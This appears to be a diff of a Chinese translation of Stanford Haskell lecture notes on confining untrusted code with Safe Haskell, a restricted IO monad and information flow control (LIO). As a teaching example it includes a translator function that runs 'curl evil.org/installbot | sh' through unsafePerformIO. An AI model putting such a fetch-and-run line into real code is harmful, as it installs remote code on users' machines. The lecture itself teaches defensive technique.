@@ -1,10 +1,10 @@
 # 不受信任的代码
 
-+   假设你想在Haskell应用程序中合并不受信任的代码。
++   假设你想在 Haskell 应用程序中合并不受信任的代码。
 
 +   例如：一些第三方翻译软件
 
-    +   你建立了一个Web服务器。
+    +   你建立了一个 Web 服务器。
 
     +   想要在每个网页上添加一个“翻译为猪拉丁语”的按钮
 
@@ -24,13 +24,13 @@
     toPigLatin = unsafePerformIO $ do system "curl evil.org/installbot | sh" return "Ia owna ouya"
     ```
 
-## [安全的Haskell](http://www.haskell.org/ghc/docs/latest/html/users_guide/safe-haskell.html)
+## [安全的 Haskell](http://www.haskell.org/ghc/docs/latest/html/users_guide/safe-haskell.html)
 
-+   从GHC 7.2开始，`-XSafe`选项启用[���全的Haskell](http://www.haskell.org/ghc/docs/latest/html/users_guide/safe-haskell.html)
++   从 GHC 7.2 开始，`-XSafe`选项启用[���全的 Haskell](http://www.haskell.org/ghc/docs/latest/html/users_guide/safe-haskell.html)
 
-    +   由我们自己的CA，David Terei提供
+    +   由我们自己的 CA，David Terei 提供
 
-+   安全的Haskell禁止导入任何不安全的模块。
++   安全的 Haskell 禁止导入任何不安全的模块。
 
     +   例如，不能导入`System.IO.Unsafe`，因此不能调用`unsafePerformIO`。
 
@@ -42,7 +42,7 @@
 
     +   上述应该保证`toPigLatin`不调用不安全的函数。
 
-+   但等等… `toPigLatin`不是使用ByteString吗？
++   但等等… `toPigLatin`不是使用 ByteString 吗？
 
     ```
     head :: {- Lazy -} ByteString -> Word8 head Empty = errorEmptyList "head" head (Chunk c _) = S.unsafeHead c unsafeHead :: {- Strict -} ByteString -> Word8 unsafeHead (PS x s l) = assert (l > 0) $ inlinePerformIO $ withForeignPtr x $ \p -> peekByteOff p s
@@ -76,15 +76,15 @@
 
     +   还可以使用`ghc-pkg`为一个包设置默认值
 
-## 如果不受信任的代码需要执行IO怎么办？
+## 如果不受信任的代码需要执行 IO 怎么办？
 
 +   假设你想要翻译成一种真实语言。
 
     +   通常需要大量数据集。
 
-    +   不受信任的代码至少需要执行文件IO。
+    +   不受信任的代码至少需要执行文件 IO。
 
-    +   或者可能最容易将文本发送到网络上，例如Google翻译。
+    +   或者可能最容易将文本发送到网络上，例如 Google 翻译。
 
 +   想法：使用*受限制的*IO Monad，`RIO`
 
@@ -114,7 +114,7 @@
 
     +   但是不能从`IO`创建`RIO`操作而不使用`UnsafeRIO`。
 
-## 练习：实现`RIO` Monad实例。
+## 练习：实现`RIO` Monad 实例。
 
 ```
 newtype RIO a = UnsafeRIO (IO a) runRIO :: RIO a -> IO a runRIO (UnsafeRIO io) = io
@@ -138,7 +138,7 @@ newtype RIO a = UnsafeRIO { runRIO :: IO a }
 newtype RIO a = UnsafeRIO (IO a)
 ```
 
-+   Monad解决方案：
++   Monad 解决方案：
 
 ```
 instance Monad RIO where return = UnsafeRIO . return m >>= k = UnsafeRIO $ runRIO m >>= runRIO . k fail = UnsafeRIO . fail
@@ -160,7 +160,7 @@ instance Monad RIO where return = UnsafeRIO . return m >>= k = UnsafeRIO $ runRI
     *Main> runRIO $ badRIO $ putStrLn "gotcha" gotcha
     ```
 
-## RIO的示例策略
+## RIO 的示例策略
 
 +   只在某些沙盒子目录下读写文件
 
@@ -170,17 +170,17 @@ instance Monad RIO where return = UnsafeRIO . return m >>= k = UnsafeRIO $ runRI
 
     +   将逃离`RIO`限制
 
-+   只允许连接到端口80，并且只能连接到已知服务器
++   只允许连接到端口 80，并且只能连接到已知服务器
 
-    +   不希望不受信任的代码发送垃圾邮件，攻击mysql等
+    +   不希望不受信任的代码发送垃圾邮件，攻击 mysql 等
 
 +   不允许访问设备
 
     +   麦克风，摄像头，扬声器等
 
-+   类似于适用于浏览器中的Java/JavaScript的策略
++   类似于适用于浏览器中的 Java/JavaScript 的策略
 
-## 为什么RIO不够
+## 为什么 RIO 不够
 
 +   如果网站包含私人数据，例如电子邮件，怎么办？
 
@@ -194,37 +194,23 @@ instance Monad RIO where return = UnsafeRIO . return m >>= k = UnsafeRIO $ runRI
 
 +   另一个攻击
 
-    +   向攻击者自己的网站发送查询，而不是Google
+    +   向攻击者自己的网站发送查询，而不是 Google
 
 +   问题：确实需要跟踪哪些信息是敏感的
 
     +   可以通过网络发送公共数据
 
-    +   不可以发送电子邮件（或者可能只能发送到特定的Google URL）
+    +   不可以发送电子邮件（或者可能只能发送到特定的 Google URL）
 
     +   可以写文件，但必须跟踪哪些文件包含谁的电子邮件
 
 +   解决方案：分散式信息流控制（DIFC）
 
-## 什么是DIFC？
+## 什么是 DIFC？
 
-![](../Images/ad1e1773cef100102de4a3a739f361b3.svg)
+![](img/ad1e1773cef100102de4a3a739f361b3.svg)
 
-+   IFC起源于军事应用和机密数据
-
-+   系统中的每个数据都有一个标签
-
-+   每个进程/线程都有一个标签
-
-+   标签部分由 ⊑ （“可以流向”）排序
-
-+   示例：Emacs（标记为*L*[E]）访问文件（标记为*L*[F]）
-
-## 什么是DIFC？
-
-![](../Images/1168dc21d8ca9952785120a071c0d7c7.svg)
-
-+   IFC起源于军事应用和机密数据
++   IFC 起源于军事应用和机密数据
 
 +   系统中的每个数据都有一个标签
 
@@ -234,13 +220,11 @@ instance Monad RIO where return = UnsafeRIO . return m >>= k = UnsafeRIO $ runRI
 
 +   示例：Emacs（标记为*L*[E]）访问文件（标记为*L*[F]）
 
-    +   文件读取？信息从文件流向emacs。系统要求*L*[F] ⊑ *L*[E]。
+## 什么是 DIFC？
 
-## 什么是DIFC？
+![](img/1168dc21d8ca9952785120a071c0d7c7.svg)
 
-![](../Images/cdb7914482cf2a7c61400465fed901ea.svg)
-
-+   IFC起源于军事应用和机密数据
++   IFC 起源于军事应用和机密数据
 
 +   系统中的每个数据都有一个标签
 
@@ -250,13 +234,29 @@ instance Monad RIO where return = UnsafeRIO . return m >>= k = UnsafeRIO $ runRI
 
 +   示例：Emacs（标记为*L*[E]）访问文件（标记为*L*[F]）
 
-    +   文件读取？信息从文件流向emacs。系统要求*L*[F] ⊑ *L*[E]。
+    +   文件读取？信息从文件流向 emacs。系统要求*L*[F] ⊑ *L*[E]。
+
+## 什么是 DIFC？
+
+![](img/cdb7914482cf2a7c61400465fed901ea.svg)
+
++   IFC 起源于军事应用和机密数据
+
++   系统中的每个数据都有一个标签
+
++   每个进程/线程都有一个标签
+
++   标签部分由 ⊑ （“可以流向”）排序
+
++   示例：Emacs（标记为*L*[E]）访问文件（标记为*L*[F]）
+
+    +   文件读取？信息从文件流向 emacs。系统要求*L*[F] ⊑ *L*[E]。
 
     +   文件写入？信息双向流动。系统强制执行*L*[F] ⊑ *L*[E]和*L*[E] ⊑ *L*[F]。
 
 ## 标签是传递的
 
-![](../Images/ef84f21d5e0772695c5d8eda134eef3d.svg)
+![](img/ef84f21d5e0772695c5d8eda134eef3d.svg)
 
 +   ⊑ 是一个传递关系 - 这样更容易推理安全性
 
@@ -266,7 +266,7 @@ instance Monad RIO where return = UnsafeRIO . return m >>= k = UnsafeRIO $ runRI
 
 ## 标签是传递的
 
-![](../Images/01d0932bc50fb966db5e25b83f374b86.svg)
+![](img/01d0932bc50fb966db5e25b83f374b86.svg)
 
 +   ⊑ 是一个传递关系 - 这样更容易推理安全性
 
@@ -278,7 +278,7 @@ instance Monad RIO where return = UnsafeRIO . return m >>= k = UnsafeRIO $ runRI
 
 ## 标签是传递的。
 
-![](../Images/7150dfc3cf6f90f19c745653c18a6750.svg)
+![](img/7150dfc3cf6f90f19c745653c18a6750.svg)
 
 +   ⊑ 是一个传递关系 - 这样更容易推理安全性。
 
@@ -294,7 +294,7 @@ instance Monad RIO where return = UnsafeRIO . return m >>= k = UnsafeRIO $ runRI
 
 ## 标签是传递的。
 
-![](../Images/544e58fc4babb7c476cba2451cc067dc.svg)
+![](img/544e58fc4babb7c476cba2451cc067dc.svg)
 
 +   ⊑ 是一个传递关系 - 这样更容易推理安全性。
 
@@ -306,7 +306,7 @@ instance Monad RIO where return = UnsafeRIO . return m >>= k = UnsafeRIO $ runRI
 
 ## 标签形成一个格。
 
-![](../Images/840793414a406d132eb1f748d430bcd6.svg)
+![](img/840793414a406d132eb1f748d430bcd6.svg)
 
 +   考虑两个用户，*A*和*B*。
 
@@ -320,9 +320,9 @@ instance Monad RIO where return = UnsafeRIO . return m >>= k = UnsafeRIO $ runRI
 
     +   使用*L*[*A*]和*L*[*B*]的最小上界（也称为*join*），写作*L*[*A*] ⊔ *L*[*B*]。
 
-## **D**IFC是**D**ecentralized。
+## **D**IFC 是**D**ecentralized。
 
-![](../Images/739182ceb37ed21f38e22fda02c3b251.svg)
+![](img/739182ceb37ed21f38e22fda02c3b251.svg)
 
 +   每个进程都有一组特权。
 
@@ -336,7 +336,7 @@ instance Monad RIO where return = UnsafeRIO . return m >>= k = UnsafeRIO $ runRI
 
 ## 示例特权。
 
-![](../Images/840793414a406d132eb1f748d430bcd6.svg)
+![](img/840793414a406d132eb1f748d430bcd6.svg)
 
 +   再次考虑简单的两用户格。
 
@@ -352,7 +352,7 @@ instance Monad RIO where return = UnsafeRIO . return m >>= k = UnsafeRIO $ runRI
 
 ## 示例特权。
 
-![](../Images/df68c9755f9b3f5cc8accd7fe19ccc88.svg)
+![](img/df68c9755f9b3f5cc8accd7fe19ccc88.svg)
 
 +   行使特权*a*实际上意味着：
 
@@ -362,7 +362,7 @@ instance Monad RIO where return = UnsafeRIO . return m >>= k = UnsafeRIO $ runRI
 
 ## `Sec`单子[[Russo]](http://www.cse.chalmers.se/~russo/seclib.htm)，[[Russo]](http://www.cse.chalmers.se/~russo/eci11/lectures/index.shtml)。
 
-+   让我们在Haskell的类型系统中编码一个非常简单的两点格。
++   让我们在 Haskell 的类型系统中编码一个非常简单的两点格。
 
     +   让类型`H`表示秘密（“高”）数据，`L`表示公共（“低”）数据。
 
@@ -572,7 +572,7 @@ instance Monad RIO where return = UnsafeRIO . return m >>= k = UnsafeRIO $ runRI
 data Level = Public | Secret | TopSecret data Compartment = Nuclear | Crypto data MilLabel = MilLabel { level :: Level , compartments :: Set Compartment }
 ```
 
-![](../Images/36b94bc817dfe70e9165613092e42f6b.svg)
+![](img/36b94bc817dfe70e9165613092e42f6b.svg)
 
 +   `wget` [`cs240h.stanford.edu/millattice.hs`](http://cs240h.scs.stanford.edu/millattice.hs)
 
@@ -630,7 +630,7 @@ data Level = Public | Secret | TopSecret data Compartment = Nuclear | Crypto dat
 
 ## 使用`Priv`对象
 
-+   许多LIO函数都有…`P`变体，需要特权
++   许多 LIO 函数都有…`P`变体，需要特权
 
     +   例如，将对`taint`的调用替换为对`taintP`的调用：
 
@@ -644,15 +644,15 @@ data Level = Public | Secret | TopSecret data Compartment = Nuclear | Crypto dat
     delegate :: SpeaksFor p => Priv p -> p -> Priv p newtype Gate p a = GateTCB (p -> a) deriving Typeable gate :: (p -> a) -> Gate p a gate = GateTCB callGate :: Gate p a -> Priv p -> a callGate (GateTCB g) = g . privDesc
     ```
 
-## 包装IO抽象
+## 包装 IO 抽象
 
-+   许多LIO抽象只是LIO本身再加上一个标签
++   许多 LIO 抽象只是 LIO 本身再加上一个标签
 
     ```
     data LObj label object = LObjTCB !label !object deriving (Typeable)
     ```
 
-+   `blessTCB`助手使构建LIO函数变得容易
++   `blessTCB`助手使构建 LIO 函数变得容易
 
     +   通过函数依赖的魔法
 
@@ -660,7 +660,7 @@ data Level = Public | Secret | TopSecret data Compartment = Nuclear | Crypto dat
     {-# LANGUAGE Trustworthy #-} import LIO.TCB.LObj type LMVar l a = LObj l (MVar a) takeLMVar :: Label l => LMVar l a -> LIO l a takeLMVar = blessTCB "takeLMVar" takeMVar tryTakeLMVar :: Label l => LMVar l a -> LIO l (Maybe a) tryTakeLMVar = blessTCB "tryTakeLMVar" tryTakeMVar putLMVar :: Label l => LMVar l a -> a -> LIO l () putLMVar = blessTCB "putLMVar" putMVar
     ```
 
-## LIO应用程序
+## LIO 应用程序
 
 +   主要应用是[Hails](http://hails.scs.stanford.edu/)网络框架
 
@@ -668,7 +668,7 @@ data Level = Public | Secret | TopSecret data Compartment = Nuclear | Crypto dat
 
 +   例如：[GitStar](http://gitstar.com/)
 
-    +   可能托管私有git仓库
+    +   可能托管私有 git 仓库
 
     +   例如，用于语法高亮代码的功能不能泄露私有源代码
 
